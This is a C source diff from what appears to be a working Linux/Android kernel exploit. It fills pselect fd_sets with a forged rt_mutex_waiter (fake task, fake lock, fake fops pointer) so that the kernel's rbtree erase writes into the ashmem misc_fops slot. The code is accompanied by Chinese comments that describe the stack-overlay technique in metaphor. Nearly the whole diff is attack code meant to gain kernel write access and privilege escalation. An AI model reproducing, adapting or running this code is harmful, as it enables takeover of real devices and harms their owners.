@@ -84,39 +84,104 @@ uint64_t fdset_get_word(const fd_set *set, int word) {
   return bits[word];
 }
 
+static int pselect_words_per_set(void) {
+  int bits_per_word = (int)(8 * sizeof(unsigned long));
+  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
+}
+
+static int pselect_put_global_word(
+    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
+    int global_word, uint64_t value) {
+  if (global_word < 0) {
+    return 0;
+  }
+  int set_idx = global_word / words_per_set;
+  int word_idx = global_word % words_per_set;
+  switch (set_idx) {
+    case 0:
+      fdset_put_word(in, word_idx, value);
+      return 1;
+    case 1:
+      fdset_put_word(out, word_idx, value);
+      return 1;
+    case 2:
+      fdset_put_word(ex, word_idx, value);
+      return 1;
+    default:
+      return 0;
+  }
+}
+
+static void pselect_put_waiter_word(
+    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
+    int waiter_word, uint64_t value, const char *name) {
+  int global_word = PSELECT_WAITER_WORD_SHIFT + waiter_word;
+  int placed = pselect_put_global_word(
+      in, out, ex, words_per_set, global_word, value);
+  if (!placed) {
+    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
+               "words_per_set=%d nfds=%d\n",
+               name, waiter_word, global_word, words_per_set,
+               PSELECT_ROUTE_NFDS);
+  }
+}
+
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
-  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
-  if (high_write < 0) {
-    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
+  (void)write_fd;
+  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
+  if (high_read < 0) {
+    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
     return;
   }
   for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
-      dup2(high_write, fd);
+      dup2(high_read, fd);
     }
   }
-  close(high_write);
+  close(high_read);
   dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
 }
 
-/* 【涂改钥匙牌的准备】fd_set 每格 8 字节，正好写下假标签的关键字段：
- * in[0]=假标签地址(鬼标签本体) ex[0]=真园长(init_task) ex[1]=假锁...
- * pselect 一进内核，这些格子被拷到栈上，盖住真排队标签。 */
+/* 【涂改钥匙牌的准备】fd_set 每格 8 字节，11-word 布局(shift=3)对齐
+ * slide.c 真机验证的 rt_mutex_waiter 骨架。仅 tree_pc/tree_left 换成
+ * fops 语义：tree_pc=fake_fops(W1 写入值), tree_left=misc_fops 槽地址
+ * (W1 写目标)。其余格子与 slide 一致(页内 RED 父指针/空子节点/
+ * fake_task/fake_lock/prio=130)，保证 walk 只碰页内 + misc_fops 槽。
+ * rbtree.c __rb_erase_augmented "Still case 1, child is node->rb_left"
+ * 分支 rebalance 恒 NULL(与颜色无关)，tree_pc 无需 RED 位。 */
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
 
-  fdset_put_word(in, 0, fake_w0);
-  fdset_put_word(in, 1, 0);
-  fdset_put_word(in, 2, 0);
-  fdset_put_word(in, 3, 0);
-  fdset_put_word(ex, 0, text_addr(INIT_TASK));
-  fdset_put_word(ex, 1, fake_lock);
-  fdset_put_word(ex, 2, 3);
-  fdset_put_word(ex, 3, 0);
+  int words_per_set = pselect_words_per_set();
+  uint64_t misc_fops_target = data_addr(ASHMEM_MISC_FOPS);
+  uint64_t waiter_prio_word = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
+
+  struct fops_waiter_word {
+    int word;
+    uint64_t value;
+    const char *name;
+  } words[] = {
+    {0, fake_fops, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, misc_fops_target, "tree_left"},
+    {3, fake_w0 - W0_OFF + LEFT_OFF + 1, "pi_parent"},
+    {4, 0, "pi_right"},
+    {5, 0, "pi_left"},
+    {6, fake_task, "task"},
+    {7, fake_lock, "lock"},
+    {8, waiter_prio_word, "wake_state_prio"},
+    {9, 0, "deadline"},
+    {10, 0, "ww_ctx"},
+  };
+  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+    struct fops_waiter_word *w = &words[i];
+    pselect_put_waiter_word(
+        in, out, ex, words_per_set, w->word, w->value, w->name);
+  }
 }
 
 /* 【趁交接瞬间动手】waiter 睡进 pselect(盖上假标签)后，本函数配合
@@ -151,11 +216,20 @@ void do_pselect_fake_lock_route(void) {
 
     int pipefd[2];
     SYSCHK(pipe(pipefd));
-    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+    if (block_fd < 0) {
+      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
+                 errno);
+      block_fd = pipefd[0];
+    }
+    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
     if (high_read < 0) {
       cfi_last_step = 31;
       cfi_last_errno = errno;
       pr_error("pselect F_DUPFD read errno=%d\n", errno);
+      if (block_fd != pipefd[0]) {
+        close(block_fd);
+      }
       close(pipefd[0]);
       close(pipefd[1]);
       break;
@@ -165,6 +239,12 @@ void do_pselect_fake_lock_route(void) {
     fd_set out;
     fd_set ex;
     prepare_pselect_fdsets(&in, &out, &ex);
+    pr_info("pselect route setup attempt=%d page=%016zx "
+            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
+            "fake_fops=%016zx misc_fops=%016llx shift=%d\n",
+            route_attempt, page_base, fake_lock, fake_w0, fake_task,
+            fake_fops, (unsigned long long)data_addr(ASHMEM_MISC_FOPS),
+            PSELECT_WAITER_WORD_SHIFT);
     open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
 
     atomic_store(&consumer_calls, 0);
@@ -203,6 +283,9 @@ void do_pselect_fake_lock_route(void) {
     }
 
     close(high_read);
+    if (block_fd != pipefd[0]) {
+      close(block_fd);
+    }
     close(pipefd[0]);
     close(pipefd[1]);
 
